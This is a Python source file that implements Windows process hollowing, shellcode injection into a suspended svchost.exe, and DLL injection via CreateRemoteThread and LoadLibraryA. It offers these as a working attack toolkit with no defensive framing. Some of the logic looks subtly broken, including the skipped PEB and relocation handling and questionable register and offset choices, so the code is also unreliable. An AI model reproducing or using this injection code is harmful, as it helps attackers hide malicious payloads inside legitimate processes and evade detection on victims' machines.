import os
import sys
import ctypes
import struct
import subprocess
import threading
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple

try:
    import psutil
except ImportError:
    pass

try:
    import win32api
    import win32con
    import win32process
    import win32security
    import win32event
except ImportError:
    pass

class ProcessHollowing:
    def __init__(self):
        self.process_handle = None
        self.thread_handle = None
        self.process_id = None
        self.thread_id = None
        
    def create_suspended_process(self, target_process="svchost.exe"):
        try:
            # Create process in suspended state
            startup_info = win32process.STARTUPINFO()
            process_info = win32process.CreateProcess(
                target_process,
                None,
                None,
                None,
                False,
                win32process.CREATE_SUSPENDED,
                None,
                None,
                startup_info
            )
            
            self.process_handle = process_info[0]
            self.thread_handle = process_info[1]
            self.process_id = process_info[2]
            self.thread_id = process_info[3]
            
            return True
        except:
            return False
    
    def get_thread_context(self):
        try:
            # Get thread context
            context = win32process.GetThreadContext(self.thread_handle)
            return context
        except:
            return None
    
    def read_process_memory(self, address, size):
        try:
            buffer = ctypes.create_string_buffer(size)
            bytes_read = ctypes.c_size_t(0)
            
            result = ctypes.windll.kernel32.ReadProcessMemory(
                self.process_handle,
                ctypes.c_void_p(address),
                buffer,
                size,
                ctypes.byref(bytes_read)
            )
            
            if result:
                return buffer.raw[:bytes_read.value]
        except:
            pass
        
        return None
    
    def write_process_memory(self, address, data):
        try:
            buffer = ctypes.create_string_buffer(data)
            bytes_written = ctypes.c_size_t(0)
            
            result = ctypes.windll.kernel32.WriteProcessMemory(
                self.process_handle,
                ctypes.c_void_p(address),
                buffer,
                len(data),
                ctypes.byref(bytes_written)
            )
            
            return result and bytes_written.value == len(data)
        except:
            return False
    
    def virtual_alloc_ex(self, size, protection=0x40):
        try:
            return ctypes.windll.kernel32.VirtualAllocEx(
                self.process_handle,
                None,
                size,
                0x3000,  # MEM_COMMIT | MEM_RESERVE
                protection
            )
        except:
            return None
    
    def virtual_protect_ex(self, address, size, protection=0x40):
        try:
            old_protection = ctypes.c_ulong(0)
            
            result = ctypes.windll.kernel32.VirtualProtectEx(
                self.process_handle,
                ctypes.c_void_p(address),
                size,
                protection,
                ctypes.byref(old_protection)
            )
            
            return result
        except:
            return False
    
    def nt_unmap_view_of_section(self, address):
        try:
            # NtUnmapViewOfSection
            result = ctypes.windll.ntdll.NtUnmapViewOfSection(
                self.process_handle,
                ctypes.c_void_p(address)
            )
            
            return result == 0
        except:
            return False
    
    def get_process_image_base(self):
        try:
            # Get PEB address from thread context
            context = self.get_thread_context()
            
            if not context:
                return None
            
            # PEB address is in EBX (x86) or RDX (x64)
            if hasattr(context, 'Ebx'):
                peb_address = context.Ebx
            elif hasattr(context, 'Rdx'):
                peb_address = context.Rdx
            else:
                return None
            
            # Read PEB
            peb_data = self.read_process_memory(peb_address, 0x20)
            
            if not peb_data:
                return None
            
            # ImageBaseAddress is at offset 0x08 (x64) or 0x08 (x86)
            image_base = struct.unpack('<Q' if sys.maxsize > 2**32 else '<I', peb_data[8:8+8 if sys.maxsize > 2**32 else 8+4])[0]
            
            return image_base
        except:
            return None
    
    def hollow_process(self, payload):
        try:
            # Step 1: Create suspended process
            if not self.create_suspended_process():
                return False
            
            # Step 2: Get image base
            image_base = self.get_process_image_base()
            
            if not image_base:
                return False
            
            # Step 3: Unmap original image
            if not self.nt_unmap_view_of_section(image_base):
                return False
            
            # Step 4: Allocate new memory
            payload_size = len(payload)
            new_image_base = self.virtual_alloc_ex(payload_size)
            
            if not new_image_base:
                return False
            
            # Step 5: Write payload
            if not self.write_process_memory(new_image_base, payload):
                return False
            
            # Step 6: Update PEB with new image base
            # This is complex and requires manual PE manipulation
            # For simplicity, we'll just write the payload and resume
            
            # Step 7: Set thread context
            context = self.get_thread_context()
            
            if not context:
                return False
            
            # Update entry point
            if hasattr(context, 'Eax'):
                context.Eax = new_image_base
            elif hasattr(context, 'Rcx'):
                context.Rcx = new_image_base
            
            win32process.SetThreadContext(self.thread_handle, context)
            
            # Step 8: Resume thread
            win32process.ResumeThread(self.thread_handle)
            
            return True
        except:
            return False
    
    def inject_shellcode(self, shellcode):
        try:
            # Create suspended process
            if not self.create_suspended_process():
                return False
            
            # Allocate memory in target process
            shellcode_size = len(shellcode)
            allocated_address = self.virtual_alloc_ex(shellcode_size)
            
            if not allocated_address:
                return False
            
            # Write shellcode
            if not self.write_process_memory(allocated_address, shellcode):
                return False
            
            # Change memory protection to executable
            if not self.virtual_protect_ex(allocated_address, shellcode_size, 0x20):
                return False
            
            # Get thread context
            context = self.get_thread_context()
            
            if not context:
                return False
            
            # Update instruction pointer
            if hasattr(context, 'Eip'):
                context.Eip = allocated_address
            elif hasattr(context, 'Rip'):
                context.Rip = allocated_address
            
            win32process.SetThreadContext(self.thread_handle, context)
            
            # Resume thread
            win32process.ResumeThread(self.thread_handle)
            
            return True
        except:
            return False
    
    def inject_dll(self, dll_path):
        try:
            # Create suspended process
            if not self.create_suspended_process():
                return False
            
            # Get LoadLibraryA address
            kernel32 = ctypes.windll.kernel32
            load_library_addr = ctypes.cast(kernel32.LoadLibraryA, ctypes.c_void_p).value
            
            # Allocate memory for DLL path
            dll_path_bytes = dll_path.encode() + b'\x00'
            allocated_address = self.virtual_alloc_ex(len(dll_path_bytes))
            
            if not allocated_address:
                return False
            
            # Write DLL path
            if not self.write_process_memory(allocated_address, dll_path_bytes):
                return False
            
            # Create remote thread to load DLL
            thread_id = ctypes.c_ulong(0)
            
            remote_thread = ctypes.windll.kernel32.CreateRemoteThread(
                self.process_handle,
                None,
                0,
                load_library_addr,
                ctypes.c_void_p(allocated_address),
                0,
                ctypes.byref(thread_id)
            )
            
            if not remote_thread:
                return False
            
            # Resume main thread
            win32process.ResumeThread(self.thread_handle)
            
            return True
        except:
            return False
    
    def run_payload_in_process(self, payload, target_process="notepad.exe"):
        try:
            # This is a simplified version - just runs payload in a new process
            process = subprocess.Popen(
                [target_process, payload],
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            return True
        except:
            return False
    
    def cleanup(self):
        try:
            if self.thread_handle:
                win32api.CloseHandle(self.thread_handle)
            
            if self.process_handle:
                win32api.CloseHandle(self.process_handle)
        except:
            pass
    
    def get_process_info(self):
        return {
            "process_id": self.process_id,
            "thread_id": self.thread_id,
            "process_handle": self.process_handle,
            "thread_handle": self.thread_handle
        }
    
    def check_process_alive(self):
        try:
            if self.process_id:
                process = psutil.Process(self.process_id)
                return process.is_running()
        except:
            pass
        
        return False
    
    def terminate_process(self):
        try:
            if self.process_handle:
                win32process.TerminateProcess(self.process_handle, 0)
                return True
        except:
            pass
        
        return False

if __name__ == "__main__":
    hollowing = ProcessHollowing()
    
    # Example: Inject simple shellcode
    shellcode = b"\x90\x90\x90\x90\xc3"  # NOP NOP NOP NOP RET
    
    print("Injecting shellcode...")
    success = hollowing.inject_shellcode(shellcode)
    
    if success:
        print("Injection successful")
        print(f"Process info: {hollowing.get_process_info()}")
    else:
        print("Injection failed")
    
    hollowing.cleanup()